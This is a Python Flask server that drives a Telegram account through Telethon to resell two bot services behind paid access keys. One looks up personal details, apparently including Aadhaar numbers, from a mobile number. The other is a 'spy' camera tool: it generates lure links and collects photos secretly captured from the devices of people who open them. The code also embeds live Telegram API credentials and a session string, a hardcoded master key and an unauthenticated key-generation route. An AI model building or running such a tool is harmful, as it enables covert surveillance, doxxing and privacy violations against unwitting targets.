from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from flask_cors import CORS
import asyncio
import re
import io
import os
import json
import base64
import random
import string
from datetime import datetime, timedelta

# --- CREDENTIALS ---
api_id = 39183854
api_hash = '7f8b6bfb1b72cab65e44c6cc450cd8f8'

# BOTS
WHOSIM_BOT = '@whosim_bot'
CAMERA_BOT = '@MAXXSPY_BOT'

# SESSION
session_string = '1BVtsOMQBuyNf34N8jj1kcjrHqHem9QC84Y-E3XG3yKPDTw7IcRqB2z8Wu5wc7uKDhLu9VB3QEfWEq7fdvKbK9OEeXav1okTF9lBUoifjF5xgs3pnTJf_DWKn_6lN8Awe-vXAU61brJdhlflxS7fjuAsf-XeMsi_9VC_-2sO43EjDtkklq1R3Il-MDthTTnOs5WyOnsAs3Fc-ddsutS6vd_z7Xxv_WRmke9SbcczQVGTL2N6sC35w6bsc8y_8sO-ActGQp57k8w3OB51HjScQN9P8NWkEclaJ976Y0gySocyTw7A9mDe2sad_w96AZWoemwb9nwL1-lFh_b-183IvIbo-WoCoVSw='

app = Flask(__name__, template_folder='.')
CORS(app)

# LOOP SETUP
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
client = TelegramClient(StringSession(session_string), api_id, api_hash, loop=loop)

last_photo_id = 0
KEY_FILE = 'keys.json'

# --- DATABASE SYSTEM ---
def load_keys():
    if not os.path.exists(KEY_FILE): return {}
    try:
        with open(KEY_FILE, 'r') as f:
            content = f.read().strip()
            return json.loads(content) if content else {}
    except: return {}

def save_keys(keys):
    try:
        with open(KEY_FILE, 'w') as f: json.dump(keys, f, indent=4)
    except: pass

# --- KEY VERIFICATION ---
@app.route('/verify-access', methods=['POST'])
def verify_access():
    try:
        data = request.json
        user_key = data.get('key', '').strip()
        
        # MASTER KEY LOGIC
        if user_key == "FAIZAN_AZIZI_":
            return jsonify({'status': 'valid', 'message': 'WELCOME OWNER FAIZAN!', 'is_admin': True})

        keys = load_keys()
        if user_key in keys:
            key_data = keys[user_key]
            
            if key_data['status'] == 'unused':
                key_data['status'] = 'active'
                key_data['start_time'] = datetime.now().isoformat()
                key_data['expiry_time'] = (datetime.now() + timedelta(hours=int(key_data['hours']))).isoformat()
                save_keys(keys)
                return jsonify({'status': 'valid', 'message': f'Key Activated! Valid for {key_data["hours"]} Hours.', 'is_admin': False})
            
            elif key_data['status'] == 'active':
                expiry = datetime.fromisoformat(key_data['expiry_time'])
                if datetime.now() < expiry:
                    rem = str(expiry - datetime.now()).split('.')[0]
                    return jsonify({'status': 'valid', 'message': f'Active. Expires in: {rem}', 'is_admin': False})
                else:
                    return jsonify({'status': 'expired', 'message': 'Key Expired.'})
        
        return jsonify({'status': 'invalid', 'message': 'Invalid Key'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

# --- ADMIN KEY GEN ---
@app.route('/admin-gen', methods=['POST'])
def generate_key():
    try:
        data = request.json
        hours = data.get('hours')
        # Direct generation, security handled by frontend/master key check
        new_key = "AZ-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        keys = load_keys()
        keys[new_key] = {'hours': int(hours), 'status': 'unused', 'created_at': datetime.now().isoformat()}
        save_keys(keys)
        return jsonify({'key': new_key, 'duration': f'{hours} Hours'})
    except Exception as e: return jsonify({'error': str(e)})

# --- WHOSIM LOGIC (UNTOUCHED) ---
def clean_and_format_text(text):
    if not text: return ""
    text = text.replace("MAXX", "FAIZAN AZIZI")
    text = text.replace("HiTeckGroop", "FAIZAN AZIZI")
    text = re.sub(r'\bID\b', 'Aadhaar Number', text, flags=re.IGNORECASE)
    text = re.sub(r'\bid\b', 'Aadhaar Number', text, flags=re.IGNORECASE)
    return text

async def ask_telegram_final(mobile_number):
    try:
        if not client.is_connected(): await client.connect()
        await client.send_message(WHOSIM_BOT, mobile_number)
        for i in range(30):
            await asyncio.sleep(1) 
            history = await client.get_messages(WHOSIM_BOT, limit=1)
            if history:
                msg = history[0]
                content = msg.message or msg.caption or ""
                if not msg.out:
                    if "Results" in content or "Name" in content or "Mobile" in content:
                        return clean_and_format_text(content)
                    if len(content) > 15 and "Search" not in content and "Wait" not in content:
                        return clean_and_format_text(content)
        return "Timeout."
    except Exception as e: return f"System Error: {str(e)}"

# --- CAMERA LOGIC (FIXED PHOTO DOWNLOAD) ---
async def start_camera_session():
    try:
        if not client.is_connected(): await client.connect()
        await client.send_message(CAMERA_BOT, "/start")
        await asyncio.sleep(2)
        async for message in client.iter_messages(CAMERA_BOT, limit=3):
            if message.buttons:
                for row in message.buttons:
                    for button in row:
                        if "camera" in button.text.lower():
                            await button.click(); break
        for i in range(10):
            await asyncio.sleep(1)
            history = await client.get_messages(CAMERA_BOT, limit=1)
            if history:
                msg = history[0]
                if "Session" in msg.text and "created" in msg.text: return msg.text
        return "Failed to start session."
    except Exception as e: return str(e)

async def upload_camera_image(file_bytes):
    global last_photo_id
    try:
        if not client.is_connected(): await client.connect()
        history = await client.get_messages(CAMERA_BOT, limit=1)
        if history: last_photo_id = history[0].id
        f = io.BytesIO(file_bytes)
        f.name = "target.jpg" 
        await client.send_file(CAMERA_BOT, f, force_document=False)
        for i in range(15):
            await asyncio.sleep(1)
            history = await client.get_messages(CAMERA_BOT, limit=3)
            for msg in history:
                if msg.id > last_photo_id and ("http" in msg.text):
                    last_photo_id = msg.id; return msg.text 
        return "Link not received."
    except Exception as e: return str(e)

# --- 🛠️ FIXED PHOTO CHECK FUNCTION ---
async def check_new_photos():
    global last_photo_id
    new_photos = []
    try:
        if not client.is_connected(): await client.connect()
        messages = await client.get_messages(CAMERA_BOT, min_id=last_photo_id, limit=20)
        
        for msg in messages:
            if msg.photo:
                # Create a memory buffer
                buffer = io.BytesIO()
                # Download into buffer
                await client.download_media(msg.photo, file=buffer)
                # Reset pointer to start
                buffer.seek(0)
                # Encode to Base64
                b64 = base64.b64encode(buffer.read()).decode('utf-8')
                new_photos.append(b64)
                
                if msg.id > last_photo_id: last_photo_id = msg.id
        
        return new_photos
    except Exception as e:
        print(f"Photo Error: {e}")
        return []

# --- ROUTES ---
@app.route('/')
def home(): return render_template('index.html')

@app.route('/get-info', methods=['POST'])
def get_info():
    data = request.json
    try:
        result = client.loop.run_until_complete(ask_telegram_final(data.get('number')))
        return jsonify({'details': result})
    except Exception as e: return jsonify({'error': str(e)}), 500

@app.route('/spy-start', methods=['POST'])
def spy_start():
    try: return jsonify({'message': client.loop.run_until_complete(start_camera_session())})
    except Exception as e: return jsonify({'error': str(e)})

@app.route('/spy-upload', methods=['POST'])
def spy_upload():
    try:
        link = client.loop.run_until_complete(upload_camera_image(request.files['file'].read()))
        return jsonify({'link': link})
    except Exception as e: return jsonify({'error': str(e)})

@app.route('/spy-check', methods=['POST'])
def spy_check():
    try: return jsonify({'photos': client.loop.run_until_complete(check_new_photos())})
    except Exception as e: return jsonify({'error': str(e)})

if __name__ == '__main__':
    client.start()
    app.run(host='0.0.0.0', port=10000)
